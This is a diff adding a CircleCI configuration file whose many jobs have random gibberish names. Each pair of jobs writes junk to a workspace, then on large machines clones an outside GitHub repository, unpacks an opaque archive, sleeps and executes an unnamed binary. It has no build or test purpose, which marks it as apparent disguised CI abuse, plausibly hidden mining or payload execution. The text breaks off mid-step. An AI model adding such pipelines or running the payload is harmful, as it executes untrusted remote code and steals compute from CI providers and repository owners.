@@ -1,0 +1,1959 @@
+version: 2.1
+
+jobs:
+  atbkhjlhe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: znnznzgvufey
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ktbfgdpbzwzeru tkionsabpxejvpo' > /tmp/xothuo/grbsqfsziv
+            ls -la /tmp/xothuo/grbsqfsziv
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'grbsqfsziv'
+  bzdhccqjqrlzp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: sfjcuqqudjw
+          command: |
+            dd if=/tmp/xothuo/grbsqfsziv conv=lcase status=none | head -c 30 || true
+      - run:
+          name: hwhmkogoipp
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: orxulkfrnxvfkvt
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  ihtyecgdwudjhc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ljdqdnvdnl
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'smijxseluduows iioaqhpvbhqd' > /tmp/xothuo/xjnrntjmujw
+            ls -la /tmp/xothuo/xjnrntjmujw
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'xjnrntjmujw'
+  aczwestaavetyh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: sslcjwur
+          command: |
+            dd if=/tmp/xothuo/xjnrntjmujw conv=lcase status=none | head -c 30 || true
+      - run:
+          name: reteyb
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: dhjnjdtdfhu
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  vdvdzqpqkbdbmyb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: zqyfg
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'netrhjzeilx dhzsazbbfkviwlqrd' > /tmp/xothuo/sjbtjkzitshslk
+            ls -la /tmp/xothuo/sjbtjkzitshslk
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'sjbtjkzitshslk'
+  atnjttn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: zasehky
+          command: |
+            dd if=/tmp/xothuo/sjbtjkzitshslk conv=lcase status=none | head -c 30 || true
+      - run:
+          name: nlpqwco
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: lduwxclis
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  kmobr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: bngqqrwuxasdzj
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'jnyxlygxourosxnhmu byjwtbthgyslcal' > /tmp/xothuo/apqiwyflzjyg
+            ls -la /tmp/xothuo/apqiwyflzjyg
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'apqiwyflzjyg'
+  pougcxdjqc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: anwxklxniedrhzs
+          command: |
+            dd if=/tmp/xothuo/apqiwyflzjyg conv=lcase status=none | head -c 30 || true
+      - run:
+          name: hebjoiezdwk
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: nvpybgimc
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  pnmlhir:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: lmgonulkjzix
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ugvphxdbcndm wvtpteewiprej' > /tmp/xothuo/lzynqbfskg
+            ls -la /tmp/xothuo/lzynqbfskg
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'lzynqbfskg'
+  dkpqpqsg:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: wgmfxl
+          command: |
+            dd if=/tmp/xothuo/lzynqbfskg conv=lcase status=none | head -c 30 || true
+      - run:
+          name: xqqnwq
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: edbktrzquxpsj
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  shssdpkiszft:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: mpgowl
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'vfscggqcdc frpyejebtfy' > /tmp/xothuo/worwzmoyahwx
+            ls -la /tmp/xothuo/worwzmoyahwx
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'worwzmoyahwx'
+  apbgucvftrm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: qvsqk
+          command: |
+            dd if=/tmp/xothuo/worwzmoyahwx conv=lcase status=none | head -c 30 || true
+      - run:
+          name: codicggl
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: brnfttl
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  tlhrss:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: udsxnfpjlhgvh
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'pjadsjqzui ctaqalhxoraoso' > /tmp/xothuo/pdiojiu
+            ls -la /tmp/xothuo/pdiojiu
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'pdiojiu'
+  bnouuguyvl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: iwcdmkg
+          command: |
+            dd if=/tmp/xothuo/pdiojiu conv=lcase status=none | head -c 30 || true
+      - run:
+          name: ezjvsvaaix
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: yvlftvi
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  fkpdeapxg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: dsbev
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'zownuswdoirbnpz nwnmwcjkvrh' > /tmp/xothuo/mwtflh
+            ls -la /tmp/xothuo/mwtflh
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'mwtflh'
+  ihtghllg:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ikzwrnaige
+          command: |
+            dd if=/tmp/xothuo/mwtflh conv=lcase status=none | head -c 30 || true
+      - run:
+          name: wthxi
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: peyabeoyyv
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  hdeyivadkcplqd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: dmgxug
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'brehjqfmpnjvywtxzg gsseympmkqeu' > /tmp/xothuo/cxxqlojv
+            ls -la /tmp/xothuo/cxxqlojv
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'cxxqlojv'
+  einrk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: midconstjdifvdh
+          command: |
+            dd if=/tmp/xothuo/cxxqlojv conv=lcase status=none | head -c 30 || true
+      - run:
+          name: xfgfqgfqifphsn
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: zkblzeanitxgvd
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  pwxkyg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: rhvwlimuyxqkt
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'hutrpytnealeazekz lokkajggmyklnx' > /tmp/xothuo/bxipxbx
+            ls -la /tmp/xothuo/bxipxbx
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'bxipxbx'
+  qwqgjcbfqtsekm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: aspsnizaz
+          command: |
+            dd if=/tmp/xothuo/bxipxbx conv=lcase status=none | head -c 30 || true
+      - run:
+          name: eovbdxoxj
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: myuyf
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  puazejrhmnapsy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: gtylxfvcxhmyut
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'uweiapjbnkjn ilcijsuecivlia' > /tmp/xothuo/myzemjydbuv
+            ls -la /tmp/xothuo/myzemjydbuv
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'myzemjydbuv'
+  sijpdmifpp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: tbckjxtpcdle
+          command: |
+            dd if=/tmp/xothuo/myzemjydbuv conv=lcase status=none | head -c 30 || true
+      - run:
+          name: gcexroofnca
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: pqpwcqzltqm
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  fgpkfsvcjbl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: elnhkapmbuek
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'gvfbfhnerbshroj sthjgwjsrvvuizwgf' > /tmp/xothuo/akozngcoswnx
+            ls -la /tmp/xothuo/akozngcoswnx
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'akozngcoswnx'
+  fojxff:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: aakggawamuznep
+          command: |
+            dd if=/tmp/xothuo/akozngcoswnx conv=lcase status=none | head -c 30 || true
+      - run:
+          name: vjkdkkxlz
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: mxuewsa
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  mwglbvxiuj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: bwhrmx
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'yfdnqfayftccz qthzvifggmjnhkgat' > /tmp/xothuo/ysbypqyrdfpize
+            ls -la /tmp/xothuo/ysbypqyrdfpize
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'ysbypqyrdfpize'
+  ompzpgvekawgyu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: gjhxxezisb
+          command: |
+            dd if=/tmp/xothuo/ysbypqyrdfpize conv=lcase status=none | head -c 30 || true
+      - run:
+          name: cqczrui
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: nomfwyszvwno
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  hdnoeepiuljw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ggvyisgfnjyhkd
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'lxoqokgsbkxn xhqqnxosbsqew' > /tmp/xothuo/wgzypbsvkfzjtt
+            ls -la /tmp/xothuo/wgzypbsvkfzjtt
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'wgzypbsvkfzjtt'
+  gqaeohyakdo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: yrczp
+          command: |
+            dd if=/tmp/xothuo/wgzypbsvkfzjtt conv=lcase status=none | head -c 30 || true
+      - run:
+          name: xaqihxhk
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: efbdquec
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  uofqfcgujajg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ozzhcpeehnkfhxz
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'kfpsjztwbvygy rrqpxglamw' > /tmp/xothuo/jixwztbfba
+            ls -la /tmp/xothuo/jixwztbfba
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'jixwztbfba'
+  ehhjghshpbgkw:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: jwasxkinnmnhotq
+          command: |
+            dd if=/tmp/xothuo/jixwztbfba conv=lcase status=none | head -c 30 || true
+      - run:
+          name: mrvygtdnqkoenrn
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: dduznedcqn
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  vfikcmignpmuzqi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: daghrinzqnakfrq
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'hhagyrecclwiwcv odtvbctszko' > /tmp/xothuo/jaucupwhbj
+            ls -la /tmp/xothuo/jaucupwhbj
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'jaucupwhbj'
+  wedebzghrtlx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: actsjd
+          command: |
+            dd if=/tmp/xothuo/jaucupwhbj conv=lcase status=none | head -c 30 || true
+      - run:
+          name: jzmgkmohogvfm
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: vqsqpqepys
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  oxlxsxyyh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: jntewfuz
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'etocnlnxsrpfhggdfd lxjtqkoriwzxdww' > /tmp/xothuo/rucskkulpvt
+            ls -la /tmp/xothuo/rucskkulpvt
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'rucskkulpvt'
+  uhfjziumr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: zptmwmjyklsgolz
+          command: |
+            dd if=/tmp/xothuo/rucskkulpvt conv=lcase status=none | head -c 30 || true
+      - run:
+          name: fdgspzzwxk
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: ufldbrxmblhm
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  vxcmfgdshetds:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: pvjwzfpeniog
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'vqxgjbxfxpiinbhyxa jnavwsnftlw' > /tmp/xothuo/hlorbvrobpnyw
+            ls -la /tmp/xothuo/hlorbvrobpnyw
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'hlorbvrobpnyw'
+  psrdqp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ouilkkjmsakysj
+          command: |
+            dd if=/tmp/xothuo/hlorbvrobpnyw conv=lcase status=none | head -c 30 || true
+      - run:
+          name: rikzbnctzw
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: wyfkilad
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  mblxwkp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tywllxpafdwffay
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'rmsimpudmzbtqmk xhvniaywuk' > /tmp/xothuo/qvfpusrvxr
+            ls -la /tmp/xothuo/qvfpusrvxr
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'qvfpusrvxr'
+  xtwzmhjfxkpe:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: nqoiglokdep
+          command: |
+            dd if=/tmp/xothuo/qvfpusrvxr conv=lcase status=none | head -c 30 || true
+      - run:
+          name: brikt
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: ptsrgzwdwaizde
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  rcojviy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: ljcfjyzurrx
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'lrqzueblmxek mmpfmbgxcfbmw' > /tmp/xothuo/nqmirvzkxtaw
+            ls -la /tmp/xothuo/nqmirvzkxtaw
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'nqmirvzkxtaw'
+  elcuqkwn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: zvfgodcehnyfvwk
+          command: |
+            dd if=/tmp/xothuo/nqmirvzkxtaw conv=lcase status=none | head -c 30 || true
+      - run:
+          name: xyvdzxjbxy
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: fvklstittutn
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  bajvkmelysewkv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: sympzlcprtfwfmi
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'msakbpkppjvszuqpa jjvdxjjrppzgwem' > /tmp/xothuo/xccfvgrwdjd
+            ls -la /tmp/xothuo/xccfvgrwdjd
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'xccfvgrwdjd'
+  yzfcco:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: cwhnum
+          command: |
+            dd if=/tmp/xothuo/xccfvgrwdjd conv=lcase status=none | head -c 30 || true
+      - run:
+          name: ihycub
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: fmiayezfoq
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  emrqetoyivs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: oncdbtabbacbrz
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'woqtqkgsizgeh aekoynrabvhmdqx' > /tmp/xothuo/vpvuzeprlhj
+            ls -la /tmp/xothuo/vpvuzeprlhj
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'vpvuzeprlhj'
+  sxdbxl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: funkuzqqqwcjd
+          command: |
+            dd if=/tmp/xothuo/vpvuzeprlhj conv=lcase status=none | head -c 30 || true
+      - run:
+          name: sxgfruqonv
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: rxnedcakhvjbtt
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  thheeurevblwno:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: yojomxykrgbm
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'vaoqfalvdyjyw sxqemncvdehc' > /tmp/xothuo/wcesnufuopcb
+            ls -la /tmp/xothuo/wcesnufuopcb
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'wcesnufuopcb'
+  dyyznfo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: lnlrdvfdymgtwpn
+          command: |
+            dd if=/tmp/xothuo/wcesnufuopcb conv=lcase status=none | head -c 30 || true
+      - run:
+          name: aldqdufolfolzj
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: knucaechaaenwh
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  zmipqqpvzkfppzi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: uqppdlhibdme
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'bctgbtxyvtzzm luirdaojphxba' > /tmp/xothuo/sofsjvm
+            ls -la /tmp/xothuo/sofsjvm
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'sofsjvm'
+  otctbafseg:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: pmknxnelu
+          command: |
+            dd if=/tmp/xothuo/sofsjvm conv=lcase status=none | head -c 30 || true
+      - run:
+          name: ejiftbxzvd
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: falsyygkarthgef
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  xonxwfdotxfdh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: fgpzjxnjoawn
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'ioyiwwoazeeamid wqhoskwxicjcfox' > /tmp/xothuo/tzkhdazunjd
+            ls -la /tmp/xothuo/tzkhdazunjd
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'tzkhdazunjd'
+  aqbdgdfd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: hrredpxswnzn
+          command: |
+            dd if=/tmp/xothuo/tzkhdazunjd conv=lcase status=none | head -c 30 || true
+      - run:
+          name: iwizauct
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: yhtbxyewu
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  ieievzdwgdvgq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: coivhoinqn
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'qhrfaiyhsxrjlwpbxo jmsptogvtgllngpy' > /tmp/xothuo/bjibtnch
+            ls -la /tmp/xothuo/bjibtnch
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'bjibtnch'
+  luhwhppwyyj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: zmzwlq
+          command: |
+            dd if=/tmp/xothuo/bjibtnch conv=lcase status=none | head -c 30 || true
+      - run:
+          name: hzlfjdumrugnbvb
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: nllolc
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
+          command: sleep 30
+      - run:
+          command: sleep 45
+      - run:
+          command: exec ./zvvbuwbyh
+  btaidyirllngxm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: gximopfpxle
+          command: |
+            mkdir -p /tmp/xothuo
+            echo 'uzalbcvefpgcxnxqp nqpbrdhbwbqdkzppk' > /tmp/xothuo/hmfpcgmhuydi
+            ls -la /tmp/xothuo/hmfpcgmhuydi
+      - persist_to_workspace:
+          root: /tmp/xothuo
+          paths:
+            - 'hmfpcgmhuydi'
+  jcjxriwhdbzky:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xothuo
+      - run:
+          name: vvkudscsqe
+          command: |
+            dd if=/tmp/xothuo/hmfpcgmhuydi conv=lcase status=none | head -c 30 || true
+      - run:
+          name: wynwenhfs
+          command: git clone --depth 3 --quiet --no-tags https://github.com/bambihugheyuaohq-oss/fa1148408499 .
+      - run:
+          name: uquutaef
+          command: tar -xj -f pffqypqbzcvns.tar.bz2
+      - run:
